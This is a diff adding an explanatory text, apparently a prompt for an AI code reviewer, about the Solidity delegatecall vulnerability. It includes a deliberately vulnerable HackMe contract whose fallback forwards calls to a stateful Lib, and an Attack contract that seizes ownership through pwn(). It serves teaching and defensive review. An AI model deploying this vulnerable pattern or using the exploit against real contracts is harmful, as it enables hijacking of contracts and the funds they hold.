@@ -1,0 +1,62 @@
+The Solidity delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.
+ Comment
+
+You must keep 2 things in mind when using delegatecall
+
+delegatecall preserves context (storage, caller, etc…)
+storage layout must be the same for the contract calling delegatecall and the contract getting called
+Here is an example. HackMe is a contract that uses delegatecall to execute code. It is not obvious that the owner of HackMe can be changed since there is no function inside HackMe to do so.
+
+contract Lib {
+    address public owner;
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract HackMe {
+    address public owner;
+    Lib public lib;
+
+    constructor(Lib _lib) {
+        owner = msg.sender;
+        lib = Lib(_lib);
+    }
+
+    fallback() external payable {
+        address(lib).delegatecall(msg.data);
+    }
+}
+However an attacker can hijack the contract by exploiting delegatecall.
+
+contract Attack {
+    address public hackMe;
+
+    constructor(address _hackMe) {
+        hackMe = _hackMe;
+    }
+
+    function attack() public {
+        hackMe.call(abi.encodeWithSignature("pwn()"));
+    }
+}
+Here is how the attack works.
+
+Alice deploys Lib
+Alice deploys HackMe with address of Lib
+Eve deploys Attack with address of HackMe
+Eve calls `Attack.attack()``
+Attack is now the owner of HackMe
+Eve called Attack.attack().
+Attack called the fallback function of HackMe sending the function selector of pwn(). HackMe forwards the call to Lib using delegatecall.
+Here msg.data contains the function selector of pwn().
+This tells Solidity to call the function pwn() inside Lib.
+The function pwn() updates the owner to msg.sender.
+Delegatecall runs the code of Lib using the context of HackMe.
+Therefore HackMe's storage was updated to msg.sender where msg.sender is the
+caller of HackMe, in this case Attack.
+
+To prevent these attacks, the library contract called from delegatecall should be stateless and does not store any data field.
+
+Given the above context, please evaluate the Solidity code snippets and files from the user input to check for delegatecall vunerabilities on stateful library contracts. If you find any, please suggest the user to refactor the library contract to stateless.
